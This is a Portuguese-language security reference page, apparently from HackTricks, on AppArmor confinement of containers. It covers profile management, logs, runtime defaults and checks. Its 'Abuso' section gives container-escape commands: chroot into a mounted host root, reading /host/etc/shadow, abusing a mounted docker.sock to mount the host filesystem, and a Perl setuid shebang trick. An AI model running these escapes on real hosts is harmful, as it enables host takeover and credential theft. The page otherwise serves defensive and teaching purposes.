# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

AppArmor é um sistema de **Controle de Acesso Obrigatório** que aplica restrições por meio de perfis por-programa. Diferentemente das verificações tradicionais de DAC, que dependem fortemente da propriedade por usuário e grupo, o AppArmor permite que o kernel aplique uma política anexada ao próprio processo. Em ambientes de container, isso importa porque um workload pode ter privilégios tradicionais suficientes para tentar uma ação e ainda assim ser negado porque seu perfil AppArmor não permite o caminho, mount, comportamento de rede ou uso de capability relevante.

O ponto conceitual mais importante é que o AppArmor é **path-based**. Ele raciocina sobre o acesso ao sistema de arquivos por meio de regras de caminho em vez de por labels como o SELinux faz. Isso o torna acessível e poderoso, mas também significa que bind mounts e layouts alternativos de caminhos merecem atenção cuidadosa. Se o mesmo conteúdo do host ficar acessível sob um caminho diferente, o efeito da política pode não ser o que o operador esperava inicialmente.

## Papel no isolamento de container

Revisões de segurança de container frequentemente param em capabilities e seccomp, mas o AppArmor continua a ser importante após essas verificações. Imagine um container que tem mais privilégio do que deveria, ou um workload que precisava de uma capability extra por razões operacionais. O AppArmor ainda pode restringir acesso a arquivos, comportamento de mounts, rede e padrões de execução de maneiras que bloqueiem o vetor de abuso óbvio. É por isso que desabilitar o AppArmor "apenas para fazer a aplicação funcionar" pode, silenciosamente, transformar uma configuração meramente arriscada em uma que é ativamente explorável.

## Laboratório

Para verificar se o AppArmor está ativo no host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver sob qual usuário o processo atual do container está sendo executado:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
A diferença é instrutiva. No caso normal, o processo deve mostrar um contexto do AppArmor vinculado ao perfil escolhido pelo runtime. No caso "unconfined", essa camada extra de restrição desaparece.

Você também pode inspecionar o que o Docker acha que aplicou:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker pode aplicar um perfil AppArmor padrão ou personalizado quando o host o suporta. Podman também pode integrar-se com AppArmor em sistemas baseados em AppArmor, embora em distribuições que priorizam SELinux o outro sistema MAC frequentemente assuma o protagonismo. Kubernetes pode expor políticas do AppArmor no nível da workload em nós que realmente suportam AppArmor. LXC e ambientes de system-container da família Ubuntu também usam AppArmor extensivamente.

O ponto prático é que AppArmor não é um "recurso do Docker". É uma funcionalidade do kernel do host que vários runtimes podem optar por aplicar. Se o host não o suporta ou o runtime é instruído a rodar unconfined, a suposta proteção realmente não existe.

Em hosts AppArmor com suporte a Docker, o padrão mais conhecido é `docker-default`. Esse perfil é gerado a partir do template AppArmor do Moby e é importante porque explica por que alguns PoCs baseados em capabilities ainda falham em um container padrão. Em termos gerais, `docker-default` permite operações de rede normais, nega gravações em grande parte de `/proc`, nega acesso a partes sensíveis de `/sys`, bloqueia operações de mount e restringe ptrace de modo que não seja uma primitiva geral de sondagem do host. Entender essa linha de base ajuda a distinguir "o container tem `CAP_SYS_ADMIN`" de "o container pode realmente usar essa capability contra as interfaces do kernel que me interessam".

## Profile Management

AppArmor profiles são normalmente armazenados em `/etc/apparmor.d/`. Uma convenção comum de nomenclatura é substituir barras no caminho do executável por pontos. Por exemplo, um perfil para `/usr/bin/man` costuma ser armazenado como `/etc/apparmor.d/usr.bin.man`. Esse detalhe importa tanto na defesa quanto na avaliação porque, uma vez que você conhece o nome do perfil ativo, frequentemente consegue localizar o arquivo correspondente rapidamente no host.

Comandos úteis de gerenciamento no host incluem:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
A razão pela qual esses comandos importam em uma referência de container-security é que eles explicam como os perfis são realmente construídos, carregados, alternados para complain mode, e modificados após mudanças na aplicação. Se um operador tem o hábito de mover perfis para complain mode durante troubleshooting e esquecer de restaurar enforcement, o container pode parecer protegido na documentação enquanto se comporta de forma muito mais permissiva na realidade.

### Construindo e Atualizando Perfis

`aa-genprof` pode observar o comportamento da aplicação e ajudar a gerar um perfil interativamente:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` pode gerar um perfil modelo que pode ser carregado posteriormente com `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando o binário muda e a política precisa ser atualizada, `aa-logprof` pode reproduzir as negações encontradas nos logs e ajudar o operador a decidir se deve permiti-las ou negá-las:
```bash
sudo aa-logprof
```
### Logs

As negações do AppArmor geralmente são visíveis através do `auditd`, syslog ou ferramentas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Isto é útil operacionalmente e de forma ofensiva. Defensores usam-no para refinar perfis. Atacantes o usam para descobrir qual caminho ou operação exata está sendo negada e se AppArmor é o controle que está bloqueando uma exploit chain.

### Identificando o arquivo de perfil exato

Quando um runtime mostra um nome de perfil AppArmor específico para um container, frequentemente é útil mapear esse nome de volta para o arquivo de perfil no disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Isso é especialmente útil durante a revisão no host porque preenche a lacuna entre "o container diz que está executando sob o perfil `lowpriv`" e "as regras reais residem neste arquivo específico que pode ser auditado ou recarregado".

## Misconfigurações

O erro mais óbvio é `apparmor=unconfined`. Administradores frequentemente definem isso enquanto depuram uma aplicação que falhou porque o perfil bloqueou corretamente algo perigoso ou inesperado. Se a flag permanecer em produção, toda a camada MAC foi efetivamente removida.

Outro problema sutil é assumir que bind mounts são inofensivos porque as permissões de arquivo parecem normais. Como o AppArmor é baseado em caminhos, expor caminhos do host sob locais de montagem alternativos pode interagir mal com as regras de caminho. Um terceiro erro é esquecer que o nome de um perfil em um arquivo de configuração significa muito pouco se o kernel do host não estiver realmente aplicando o AppArmor.

## Abuso

Quando o AppArmor desaparece, operações que antes eram restringidas podem de repente funcionar: ler caminhos sensíveis através de bind mounts, acessar partes de procfs ou sysfs que deveriam ter permanecido mais difíceis de usar, realizar ações relacionadas a mount se capabilities/seccomp também as permitirem, ou usar caminhos que um perfil normalmente negaria. O AppArmor costuma ser o mecanismo que explica por que uma tentativa de breakout baseada em capabilities "deveria funcionar" na teoria, mas ainda falha na prática. Remova o AppArmor, e a mesma tentativa pode começar a ter sucesso.

Se você suspeita que o AppArmor é o principal fator impedindo uma path-traversal, bind-mount ou cadeia de abuso baseada em mount, o primeiro passo geralmente é comparar o que fica acessível com e sem um perfil. Por exemplo, se um caminho do host estiver montado dentro do container, comece verificando se você consegue percorrê-lo e lê-lo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se o container também tiver uma capability perigosa como `CAP_SYS_ADMIN`, um dos testes mais práticos é verificar se o AppArmor é o controle que está bloqueando operações de mount ou o acesso a sistemas de arquivos sensíveis do kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Em ambientes onde um caminho do host já está disponível por meio de um bind mount, a perda do AppArmor também pode transformar uma vulnerabilidade de divulgação de informações somente leitura em acesso direto a arquivos do host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
O objetivo desses comandos não é que o AppArmor, por si só, provoque a fuga. O ponto é que, uma vez removido o AppArmor, muitos vetores de abuso baseados em sistema de arquivos e em montagens tornam-se imediatamente testáveis.

### Exemplo completo: AppArmor desativado + root do host montado

Se o container já tiver o root do host montado com bind em `/host`, remover o AppArmor pode transformar um caminho de abuso no sistema de arquivos bloqueado em uma fuga completa para o host:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Uma vez que o shell está executando no sistema de arquivos do host, a carga de trabalho efetivamente escapou da fronteira do container:
```bash
id
hostname
cat /etc/shadow | head
```
### Exemplo completo: AppArmor desativado + Runtime Socket

Se a verdadeira barreira era o AppArmor em torno do estado de runtime, um socket montado pode ser suficiente para um escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
O caminho exato depende do ponto de montagem, mas o resultado final é o mesmo: AppArmor não está mais impedindo o acesso à runtime API, e a runtime API pode lançar um container que compromete o host.

### Exemplo completo: Path-Based Bind-Mount Bypass

Porque AppArmor é baseado em caminhos, proteger `/proc/**` não protege automaticamente o mesmo conteúdo procfs do host quando ele estiver acessível através de um caminho diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
O impacto depende do que exatamente está montado e se o caminho alternativo também contorna outros controles, mas esse padrão é uma das razões mais claras pelas quais o AppArmor deve ser avaliado juntamente com o mount layout em vez de isoladamente.

### Exemplo Completo: Shebang Bypass

A política do AppArmor às vezes mira um caminho de interpretador de modo que não considera completamente a execução de scripts via shebang. Um exemplo histórico envolveu usar um script cuja primeira linha aponta para um interpretador confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Este tipo de exemplo é importante como lembrete de que a intenção do perfil e a semântica de execução real podem divergir. Ao revisar AppArmor em ambientes container, cadeias de interpretadores e caminhos alternativos de execução merecem atenção especial.

## Verificações

O objetivo dessas verificações é responder rapidamente a três perguntas: o AppArmor está habilitado no host, o processo atual está confinado, e o runtime realmente aplicou um perfil a este container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
O que é interessante aqui:

- Se `/proc/self/attr/current` mostrar `unconfined`, a carga de trabalho não está se beneficiando do confinamento AppArmor.
- Se `aa-status` mostrar AppArmor desabilitado ou não carregado, qualquer nome de perfil na configuração de runtime é, na maior parte, apenas cosmético.
- Se `docker inspect` mostrar `unconfined` ou um perfil customizado inesperado, isso frequentemente é a razão pela qual um caminho de abuso baseado em sistema de arquivos ou em mount funciona.

Se um container já possui privilégios elevados por razões operacionais, manter o AppArmor habilitado frequentemente faz a diferença entre uma exceção controlada e uma falha de segurança muito mais ampla.

## Runtime Defaults

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimentos manuais comuns |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por padrão em hosts com suporte a AppArmor | Usa o perfil AppArmor `docker-default` a menos que seja sobrescrito | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dependente do host | AppArmor é suportado através de `--security-opt`, mas o padrão exato depende do host/runtime e é menos universal do que o perfil `docker-default` documentado do Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Padrão condicional | Se `appArmorProfile.type` não for especificado, o padrão é `RuntimeDefault`, mas ele só é aplicado quando AppArmor está habilitado no nó | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` com um perfil fraco, nós sem suporte a AppArmor |
| containerd / CRI-O under Kubernetes | Segue o suporte do nó/runtime | Runtimes com suporte comum ao Kubernetes suportam AppArmor, mas a aplicação real ainda depende do suporte do nó e das configurações da carga de trabalho | Mesmo que a linha do Kubernetes; a configuração direta do runtime também pode ignorar o AppArmor completamente |

Para o AppArmor, a variável mais importante frequentemente é o **host**, não apenas o runtime. Uma configuração de perfil em um manifesto não cria confinamento em um nó onde o AppArmor não está habilitado.
{{#include ../../../../banners/hacktricks-training.md}}
